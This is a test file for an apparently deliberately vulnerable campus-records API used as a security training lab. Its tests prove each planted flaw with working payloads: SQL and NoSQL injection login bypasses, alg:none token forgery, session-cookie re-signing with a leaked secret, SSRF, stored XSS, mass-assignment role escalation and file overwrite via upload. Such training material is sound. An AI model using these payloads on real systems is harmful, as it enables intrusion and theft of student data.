'use strict';

import test, { before, after } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';

import { startApp } from './lib/appServer.js';
import { makeClient, craftToken } from './lib/http.js';

const md5 = (v) => crypto.createHash('md5').update(String(v)).digest('hex');
async function loginStudent(user = 'student1', pass = 'student1') {
  const c = makeClient(base);
  const r = await c.post('/students/login', { username: user, password: pass });
  assert.equal(r.json.result, 'success', `logged in as ${user}`);
  return c;
}

let app;
let base;

before(async () => {
  app = await startApp();
  base = app.base;
});

after(async () => {
  if (app) await app.stop();
});

/*
 * The Semester Heist — API walkthrough.
 * Each test proves the documented weakness (VULN_MAP id in the title) behaves
 * exactly as STORYLINE.md describes. Sequential, like the storyline itself.
 */

test('Act 0 · Case the campus — apidoc, /status, /debug, /api/v0 leak as documented (API9/CFG-3/CFG-4/BAC-6)', async () => {
  const c = makeClient(base);

  const apidoc = await c.rootGet('/apidoc/');
  assert.equal(apidoc.status, 200, 'apidoc reference is exposed');

  const status = await c.rootGet('/status');
  assert.equal(status.status, 200);
  assert.ok(status.json.data.config.sessionSecret, 'CFG-3: /status leaks sessionSecret');
  assert.ok(status.json.data.config.campusTokenSecret, 'CFG-3: /status leaks campusTokenSecret');

  const debug = await c.rootGet('/debug');
  assert.equal(debug.status, 200);
  assert.ok(debug.json.data.env, 'CFG-4: /debug dumps process env');

  const legacy = await c.rootGet('/api/v0/students/1');
  assert.equal(legacy.status, 200, 'BAC-6: legacy v0 needs no auth');
  assert.ok(legacy.json.data.password, 'BAC-6/BOP-2: legacy record exposes the password hash');
  assert.ok(legacy.json.data.api_key, 'BAC-6/BOP-2: legacy record exposes the api_key');
});

test('Act 1 · Get a foothold — injection auth-bypass and the parameterised contrast (INJ-1 / safe)', async () => {
  // Normal login works.
  const c = makeClient(base);
  const ok = await c.post('/students/login', { username: 'student1', password: 'student1' });
  assert.equal(ok.json.result, 'success', 'normal login succeeds');

  // INJ-1: classic injection bypass with a wrong password logs in anyway.
  const inj = makeClient(base);
  const bypass = await inj.post('/students/login', {
    username: "nobody' OR '1'='1' -- ",
    password: 'definitely-wrong',
  });
  assert.equal(bypass.json.result, 'success', 'INJ-1: auth bypass via injection');

  // Safe-by-contrast: the parameterised book lookup returns exactly one row and cannot be broken the same way.
  const safe = await c.get('/library/list/book/1');
  assert.equal(safe.json.result, 'success');
  assert.equal(safe.json.data.length, 1, 'parameterised query returns exactly book 1');

  // LOG-1: the injected input was logged in cleartext by the DB layer.
  assert.ok(app.getLog().includes('executed query'), 'LOG-1: queries logged in cleartext');
  assert.ok(app.getLog().includes("OR '1'='1'"), 'LOG-1: injected input reached the logs verbatim');
});

test('Act 2 · Read the class — BOLA over student records and transcripts (BAC-1 / BAC-2 / BOP-2)', async () => {
  const c = makeClient(base);
  await c.post('/students/login', { username: 'student1', password: 'student1' });

  // BAC-1: read another student's full record by id.
  const other = await c.get('/students/list/2');
  assert.equal(other.json.result, 'success');
  const rec = other.json.data[0];
  assert.equal(rec.id, 2, 'BAC-1: reached student 2');
  assert.ok(rec.password && rec.api_key, 'BOP-2: full record incl. secrets returned');

  // BAC-2: read another student's transcript by id (no ownership check).
  const tr = await c.get('/registrar/transcript/2');
  assert.equal(tr.json.result, 'success');
  assert.ok(tr.json.data.length > 0, 'BAC-2: transcript rows for student 2 returned');
  assert.ok(tr.json.data.every((r) => r.student_id === 2));
});

test('Act 3 · Change who you are — mass assignment elevates role (BOP-1)', async () => {
  const c = makeClient(base);
  await c.post('/students/login', { username: 'student1', password: 'student1' });

  const before = await c.get('/me');
  assert.equal(before.json.data.role, 'student', 'starts as student');

  const patched = await c.patch('/me', { role: 'faculty', gpa: 4.0 });
  assert.equal(patched.json.result, 'success');
  assert.equal(patched.json.data.role, 'faculty', 'BOP-1: role mass-assigned to faculty');
  assert.equal(patched.json.data.gpa, 4, 'BOP-1: gpa mass-assigned');
});

test('Act 4 · Rewrite the record — BFLA grade change works for a plain student (BAC-3)', async () => {
  // Fresh student session (role student) — proves no function-level authz.
  const c = makeClient(base);
  await c.post('/students/login', { username: 'student2', password: 'student2' });

  const me = await c.get('/me');
  assert.equal(me.json.data.role, 'student', 'acting as a plain student');

  const graded = await c.post('/registrar/grade', { transcriptId: 1, grade: 'A+' });
  assert.equal(graded.json.result, 'success', 'BAC-3: student can call the faculty grade function');
  assert.equal(graded.json.data.grade, 'A+', 'grade was written');
});

test('Act 5 · Breach campus security — NoSQL injection, token forgery, BFLA roster (INJ-6 / CRY-4 / BAC-5)', async () => {
  const c = makeClient(base);

  // INJ-6: NoSQL operator injection returns a superadmin without credentials.
  const nosql = await c.post('/campus/security/login', {
    username: { $gt: '' },
    password: { $gt: '' },
  });
  assert.equal(nosql.json.result, 'success', 'INJ-6: NoSQL injection bypass');
  assert.ok(nosql.json.data.pass, 'BOP-2: superadmin doc incl. password returned');
  assert.ok(nosql.json.data.clearance, 'superadmin clearance returned');

  // CRY-4: a forged alg:none token is accepted by the verifier.
  const forged = craftToken({ alg: 'none', typ: 'CAMPUS' }, { sub: 999, name: 'mallory', role: 'admin' });
  const who = await c.get('/sso/whoami', { headers: { authorization: 'Bearer ' + forged } });
  assert.equal(who.json.result, 'success', 'CRY-4: alg:none token accepted');
  assert.equal(who.json.data.role, 'admin', 'forged role honoured');

  // BAC-5: the "admin" roster is reachable with a merely-present (forged) token.
  const roster = await c.get('/sso/admin/roster', { headers: { authorization: 'Bearer ' + forged } });
  assert.equal(roster.json.result, 'success', 'BAC-5: roster reachable with forged token');
  assert.ok(roster.json.data.some((u) => u.password), 'BOP-2: roster exposes password hashes');
});

test('Act 6 · Reach inside & go quiet — SSRF, unsafe upstream consumption, upload integrity, stored XSS (SSR-1 / UAP-1 / INT-1 / XSS-1)', async () => {
  const c = makeClient(base);
  await c.post('/students/login', { username: 'student1', password: 'student1' });

  // SSR-1: server fetches an internal-only URL and returns a preview of it.
  const ssrf = await c.post('/me/avatar/import', { url: base + '/status' });
  assert.equal(ssrf.json.result, 'success', 'SSR-1: avatar import fetched the URL');
  assert.equal(ssrf.json.data.status, 200, 'SSR-1: server-side fetch reached the internal endpoint');
  assert.match(ssrf.json.data.contentType, /application\/json/, 'SSR-1: fetched the JSON ops endpoint');
  assert.ok(ssrf.json.data.preview.includes('"node"'),
    'SSR-1: SSRF returned the internal /status body (config secrets follow in the full response)');
  const meAfterImport = await c.get('/me');
  assert.equal(meAfterImport.json.data.avatar_url, base + '/status',
    'SSR-1: the user-supplied URL was also persisted to the profile record');

  // UAP-1: the timetable importer trusts and reflects the upstream response.
  const uap = await c.post('/me/timetable/import', { feedUrl: base + '/api/v1/students/ping' });
  assert.equal(uap.json.result, 'success', 'UAP-1: upstream consumed');
  assert.ok('ping' in uap.json.data, 'UAP-1: upstream body reflected as-is');

  // INT-1: upload with a bogus checksum, stored under the client name, served back.
  const form = new FormData();
  const name = `notes-${Date.now()}.html`;
  form.append('file', new Blob(['<h1>unverified</h1>'], { type: 'text/html' }), name);
  form.append('checksum', 'totally-not-checked');
  const up = await c.post('/courses/materials', undefined, { form });
  assert.equal(up.json.result, 'success', 'INT-1: upload accepted');
  assert.equal(up.json.data.checksum, 'totally-not-checked', 'INT-1: client checksum stored unverified');
  const served = await c.rootGet(up.json.data.stored_path);
  assert.equal(served.status, 200, 'INT-1: uploaded file served back from /uploads');
  assert.ok(served.text.includes('unverified'), 'INT-1: served content matches upload');

  // INT-1 (type): a "spreadsheet" part with a binary-ish body is accepted with no
  // type filtering, and round-trips from /uploads just like the HTML one.
  const xlsxName = `grades-${Date.now()}.xlsx`;
  const xlsxForm = new FormData();
  xlsxForm.append('file',
    new Blob(['PK\x03\x04 not a real workbook'], { type: 'application/octet-stream' }), xlsxName);
  const xlsx = await c.post('/courses/materials', undefined, { form: xlsxForm });
  assert.equal(xlsx.json.result, 'success', 'INT-1: .xlsx part accepted, no type checks');
  assert.equal(xlsx.json.data.checksum, null, 'INT-1: absent checksum stored as null');
  const xlsxServed = await c.rootGet(xlsx.json.data.stored_path);
  assert.equal(xlsxServed.status, 200, 'INT-1: .xlsx part served back from /uploads');
  assert.ok(xlsxServed.text.includes('not a real workbook'), 'INT-1: .xlsx content round-trips');

  // INT-1 (size): an 11 MiB payload comfortably exceeds common upload limits and
  // is still accepted whole.
  const bigName = `blob-${Date.now()}.bin`;
  const bigForm = new FormData();
  bigForm.append('file', new Blob([new Uint8Array(11 * 1024 * 1024).fill(7)]), bigName);
  const big = await c.post('/courses/materials', undefined, { form: bigForm });
  assert.equal(big.json.result, 'success', 'INT-1: 11 MiB upload accepted, no size limit');
  const bigServed = await c.rootGet(big.json.data.stored_path);
  assert.equal(bigServed.status, 200, 'INT-1: oversized file served back from /uploads');

  // INT-1 (filename): files are stored under the client-supplied name with no
  // deduplication or ownership check, so a same-named upload from another user
  // silently overwrites the first file on disk.
  const clash = `shared-${Date.now()}.txt`;
  const formA = new FormData();
  formA.append('file', new Blob(['first writer'], { type: 'text/plain' }), clash);
  const a = await c.post('/courses/materials', undefined, { form: formA });
  assert.equal(a.json.result, 'success', 'INT-1: first upload accepted');

  const c2 = await loginStudent('student2', 'student2');
  const formB = new FormData();
  formB.append('file', new Blob(['second writer'], { type: 'text/plain' }), clash);
  const b = await c2.post('/courses/materials', undefined, { form: formB });
  assert.equal(b.json.result, 'success', 'INT-1: second user uploads the same filename');
  assert.equal(b.json.data.stored_path, a.json.data.stored_path,
    'INT-1: both records point at the one client-named path');

  const after = await c.rootGet(`/uploads/${clash}`);
  assert.equal(after.status, 200);
  assert.ok(after.text.includes('second writer'), 'INT-1: same-named upload overwrote the first file');
  assert.ok(!after.text.includes('first writer'), 'INT-1: the earlier file content is gone');

  // XSS-1: announcement markdown is rendered to HTML without sanitisation.
  const payload = '<img src=x onerror="alert(1)">';
  await c.post('/courses/announcements', { body: payload });
  const anns = await c.get('/courses/announcements');
  assert.equal(anns.json.result, 'success');
  assert.ok(anns.json.data.some((a) => a.html.includes('onerror')),
    'XSS-1: raw event handler survives rendering');
});

/*
 * Detailed per-id coverage of the remaining documented weaknesses
 * (VULN_MAP.md ids), so every entry on the map is exercised, not just the
 * storyline's headline vuln per act.
 */

test('INJ-2 · SQLite student-detail injection returns more than the requested row', async () => {
  const c = await loginStudent();
  const one = await c.get('/students/list/1');
  assert.equal(one.json.data.length, 1, 'plain id returns a single student');

  const inj = await c.get('/students/list/' + encodeURIComponent('1 OR 1=1'));
  assert.equal(inj.json.result, 'success');
  assert.ok(inj.json.data.length >= 3, 'INJ-2: boolean injection returns every student');
});

test('INJ-3 · MySQL lending login: UNION injection forges a login (+ stacked queries enabled)', async () => {
  const c = makeClient(base);
  // A crafted UNION supplies a row whose password column equals a value we choose.
  const bypass = await c.post('/lending/login', {
    username: 'nope" UNION SELECT 1,"intruder","letmein',
    password: 'letmein',
  });
  assert.equal(bypass.json.result, 'success', 'INJ-3: UNION injection bypasses the login');

  // The verbose SQL error also proves input reaches MySQL unsanitised (CFG-2).
  const err = await c.post('/lending/login', { username: 'x"', password: 'y' });
  assert.match(String(err.json.result), /SQL syntax/i, 'CFG-2/INJ-3: raw SQL error returned to the client');
});

test('INJ-4 · PostgreSQL library filter is bypassable (whitespace stripping only)', async () => {
  const c = makeClient(base);
  const plain = await c.get('/library/list/student/1');
  const baseline = plain.json.data.length;

  // Tabs survive the space-only filter and Postgres treats them as whitespace.
  const inj = await c.get('/library/list/student/' + encodeURIComponent('1\tOR\t1=1'));
  assert.equal(inj.json.result, 'success');
  assert.ok(inj.json.data.length > baseline, 'INJ-4: filter bypassed, all books returned');
});

test('INJ-5 · PostgreSQL registrar transcript injection returns every transcript', async () => {
  const c = await loginStudent();
  const mine = await c.get('/registrar/transcript/1');
  const baseline = mine.json.data.length;

  const inj = await c.get('/registrar/transcript/' + encodeURIComponent('1 OR 1=1'));
  assert.equal(inj.json.result, 'success');
  assert.ok(inj.json.data.length > baseline, 'INJ-5: injection returns transcripts beyond student 1');
});

test('CRY-3 · the session secret leaked by /status signs valid session cookies', async () => {
  // Log in and read the signed session cookie (express-session: "s:<sid>.<hmac>").
  const res = await fetch(`${base}/api/v1/students/login`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username: 'student1', password: 'student1' }),
  });
  const [name, value] = res.headers.getSetCookie()[0].split(';')[0].split('=');
  const signed = decodeURIComponent(value);
  const sid = signed.slice(2, signed.lastIndexOf('.'));

  // Re-sign the session id with the secret that /status discloses (CFG-3).
  const status = await makeClient(base).rootGet('/status');
  const secret = status.json.data.config.sessionSecret;
  const hmac = crypto.createHmac('sha256', secret).update(sid).digest('base64').replace(/=+$/, '');
  assert.equal(`s:${sid}.${hmac}`, signed, 'CRY-3: the leaked secret reproduces the server signature');

  // A cookie signed only with the leaked secret is accepted as the session.
  const me = await fetch(`${base}/api/v1/me`, { headers: { cookie: `${name}=${encodeURIComponent(`s:${sid}.${hmac}`)}` } });
  assert.equal(me.status, 200, 'CRY-3: a self-signed session cookie is accepted');
});

test('DSN-1 · privileged registrar flows have no business-rule guardrails', async () => {
  const c = await loginStudent('student2', 'student2');
  const graded = await c.post('/registrar/grade', { transcriptId: 2, grade: 'Z-' });
  assert.equal(graded.json.result, 'success', 'DSN-1: a grade outside any grading scale is accepted');
  assert.equal(graded.json.data.grade, 'Z-');

  const enrolled = await c.post('/registrar/enroll', { studentId: 2, course: 'NOT-A-COURSE', term: '1850-SPRING' });
  assert.equal(enrolled.json.result, 'success', 'DSN-1: enrollment into an unknown course and past term is accepted');
});

test('BAC-4 · a plain student can enroll any student id (BFLA / horizontal)', async () => {
  const c = await loginStudent('student2', 'student2');
  const enrolled = await c.post('/registrar/enroll', {
    studentId: 1, course: 'CS999 Injected Seminar', term: '2099-FALL',
  });
  assert.equal(enrolled.json.result, 'success', 'BAC-4: enroll accepted for another student');
  assert.equal(enrolled.json.data.student_id, 1);
});

test('CRY-1 · MySQL credentials are compared as plaintext (not hashed)', async () => {
  const c = makeClient(base);
  const literal = await c.post('/lending/login', { username: 'admin', password: 'admin' });
  assert.equal(literal.json.result, 'success', 'CRY-1: literal plaintext password authenticates');

  // If the value were hashed, supplying the md5 of the password would match instead.
  const hashed = makeClient(base);
  const asHash = await hashed.post('/lending/login', { username: 'admin', password: md5('admin') });
  assert.notEqual(asHash.json.result, 'success', 'CRY-1: the stored value is the plaintext, not a hash');
});

test('CRY-2 · SQLite passwords are unsalted MD5', async () => {
  const c = await loginStudent();
  const me = await c.get('/me');
  assert.equal(me.json.data.password, md5('student1'),
    'CRY-2: stored password equals the unsalted md5 of the plaintext');
});

test('AUT-1 · no rate limiting or lockout on repeated failed logins', async () => {
  const c = makeClient(base);
  let throttled = false;
  for (let i = 0; i < 20; i++) {
    const r = await c.post('/students/login', { username: 'student1', password: 'wrong' + i });
    if (r.status === 429) throttled = true;
  }
  assert.equal(throttled, false, 'AUT-1: 20 rapid failures, never throttled');
  // And the account is not locked afterwards.
  const ok = await c.post('/students/login', { username: 'student1', password: 'student1' });
  assert.equal(ok.json.result, 'success', 'AUT-1: no lockout after repeated failures');
});

test('CFG-1 · reflective CORS echoes any origin with credentials allowed', async () => {
  const c = makeClient(base);
  const r = await c.get('/students/ping', { headers: { origin: 'https://evil.example' } });
  assert.equal(r.headers.get('access-control-allow-origin'), 'https://evil.example',
    'CFG-1: arbitrary origin reflected');
  assert.equal(r.headers.get('access-control-allow-credentials'), 'true',
    'CFG-1: credentials allowed cross-origin');
});

test('CFG-2 · malformed input returns a stack trace to the client', async () => {
  const res = await fetch(base + '/api/v1/students/login', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '{ this is not json',
  });
  const body = await res.json();
  assert.ok(typeof body.stack === 'string' && body.stack.includes(' at '),
    'CFG-2: internal stack trace leaked in the error response');
});

test('CFG-5 · weak service posture is observable (MySQL root, exposed DB config)', async () => {
  const c = makeClient(base);
  const status = await c.rootGet('/status');
  assert.equal(status.json.data.config.mysql.user, 'root', 'CFG-5: MySQL runs as root');
  assert.equal(status.json.data.config.mysql.password, 'root', 'CFG-5: weak root password');
  assert.ok(status.json.data.config.postgres.user, 'CFG-5: Postgres connection details exposed');
});

test('CMP-1 · the outdated component is pinned as documented', async () => {
  const pkg = JSON.parse(fs.readFileSync(new URL('../package.json', import.meta.url)));
  assert.equal(pkg.dependencies.marked, '0.3.6',
    'CMP-1: marked is pinned to the documented outdated version');
});

test('DSN-2 · list endpoint has no pagination or limit enforcement', async () => {
  const c = await loginStudent();
  const all = await c.get('/students/list');
  const full = all.json.data.length;
  assert.ok(full >= 3, 'baseline student count returned');
  // A limit hint is ignored; the full set still comes back.
  const limited = await c.get('/students/list?limit=1');
  assert.equal(limited.json.data.length, full, 'DSN-2: limit param ignored, full set returned');
});

test('DSN-3 · sensitive business flow (enroll) is open to unthrottled automation', async () => {
  const c = await loginStudent();
  const results = [];
  for (let i = 0; i < 5; i++) {
    const r = await c.post('/registrar/enroll', { studentId: 1, course: `BULK-${i}`, term: '2099-FALL' });
    results.push(r.json.result);
  }
  assert.ok(results.every((r) => r === 'success'), 'DSN-3: repeated enrollments all succeed, no throttle');
});

test('LOG-2 · privileged actions leave no audit trail', async () => {
  const c = await loginStudent();
  await c.post('/registrar/grade', { transcriptId: 2, grade: 'A+' });
  const log = app.getLog();
  // Privileged writes are logged only as raw queries (LOG-1); no audit/security event exists.
  assert.equal(/audit|security event|privileged action/i.test(log), false,
    'LOG-2: no audit or security event recorded for privileged actions');
});
